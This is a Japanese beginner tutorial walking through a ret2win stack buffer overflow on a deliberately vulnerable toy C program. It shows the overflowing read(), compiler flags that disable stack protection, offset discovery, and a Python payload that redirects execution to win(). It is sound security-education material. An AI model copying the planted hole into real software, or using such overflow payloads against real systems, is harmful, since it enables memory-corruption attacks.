# step5：戻り先を書き換えて win() を乗っ取る（ret2win）

> 総仕上げ。本来呼ばれない win() を、長い入力だけで動かす。

## ゴール

入力を2つの部分で作る：

```
[ 詰め物：A をちょうど24個 ][ win() の本物の住所（8バイト） ]
 └─ buf＋間の隙間を埋める ─┘ └─ ここが戻り先メモに重なる ─┘
```

後半の住所がちょうど戻り先メモに乗るので、関数が戻る（ret）とき CPU は win() へ飛ぶ。

## コード（step5.c）

```c
#include <stdio.h>
#include <unistd.h>

__attribute__((force_align_arg_pointer))   // ← 足場を自分で揃えるおまじない（下記参照）
void win(void){
    printf("\n*** 乗っ取り成功！本来呼ばれないwin()が動いた ***\n");
}
void vulnerable(void){
    char buf[16];
    read(0, buf, 200);          // 16箱なのに最大200読む＝溢れる余地
}
int main(void){
    vulnerable();
    printf("main: 普通に終了\n");  // 乗っ取れなければ、こちらが出る
    return 0;
}
```

- `win()` はどこからも呼ばれていない。普通に実行したら絶対動かない関数。これを溢れの力だけで動かすのが目標。

## ビルド

```bash
gcc -g -O0 -fno-stack-protector -no-pie -o step5 step5.c
```

`read writing 200 bytes into a region of size 16 overflows` という warning が出るが、
それは**わざと仕込んだ罠をコンパイラが見抜いているだけ**。今回は承知の上なので無視でOK。

## 手順1：詰め物の個数（オフセット）を突き止める

A の個数を変えて、「どこから壊れ始めるか」を探す。

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*16)" | ./step5   # → main: 普通に終了（無事）
python3 -c "import sys; sys.stdout.buffer.write(b'A'*24)" | ./step5   # → 無事
python3 -c "import sys; sys.stdout.buffer.write(b'A'*32)" | ./step5   # → Segmentation fault（壊れた）
```

24と32の間に境目がある。次の確認で 24 がちょうどだと分かる：

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*24 + b'B'*8)" | ./step5
# → general protection fault（B=0x42 で戻り先メモが埋まり、0x4242... という
#    “存在しえない住所”へ飛ぼうとして弾かれた）= B がちょうど戻り先メモに乗った証拠
#    → 詰め物は 24個 で確定
```

> `general protection fault` は普通の segfault とは別物。「存在しえない形式の住所」を
> CPU が弾いた印で、狙いが戻り先メモに当たっている強いサインになる。

## 手順2：発動

```bash
WIN=$(nm step5 | awk '/ T win$/{print $1}')          # win() の住所を自動取得
echo "win()の住所 = 0x$WIN"
python3 -c "import sys,struct; sys.stdout.buffer.write(b'A'*24 + struct.pack('<Q', int('$WIN',16)))" | ./step5
```

成功すると：

```
*** 乗っ取り成功！本来呼ばれないwin()が動いた ***
Segmentation fault (core dumped)
```

- `struct.pack('<Q', ...)` は住所を「メモリが読める8バイトの並び」に変換する装置。
- 後ろの `Segmentation fault` は気にしなくてよい。win() は無事に動いてメッセージを出し、
  その後「次どこへ戻る？」で力尽きただけ。**メッセージが出た時点で乗っ取りは成立**。

## 罠：64ビットの16バイトアライメント

64ビットには「関数に入る瞬間、足場（スタック）が16の倍数に揃っていないと printf が内部でコケる」
という決まりがあり、今回の位置はたまたまそれに当たる。
`__attribute__((force_align_arg_pointer))` は win() に「動く前に自分で足場を揃える」コードを
足すおまじないで、これを回避している。
（本格的な攻撃では、代わりに `ret` ガジェットを1個挟んで整列させるのが定番）

## 用語まとめ

- **ret2win**：戻り先を、プログラム内の「勝ちフラグ」的な関数(win)の住所に書き換える、最も基本の型。
- **オフセット**：buffer の先頭から戻り先メモまでの距離（今回は 24 バイト）。
- **little-endian（`<Q`）**：x86-64 は住所を下位バイトから並べる。だから手で書くのは面倒で、
  `struct.pack` に任せる。

## 次の一歩

- `-fno-stack-protector` を外してカナリアを復活 → 同じ攻撃が弾かれるのを見る
- win() 自作の代わりに `/bin/sh` を起動させる **ret2libc**
- picoCTF / pwnable.kr の pwn 問題
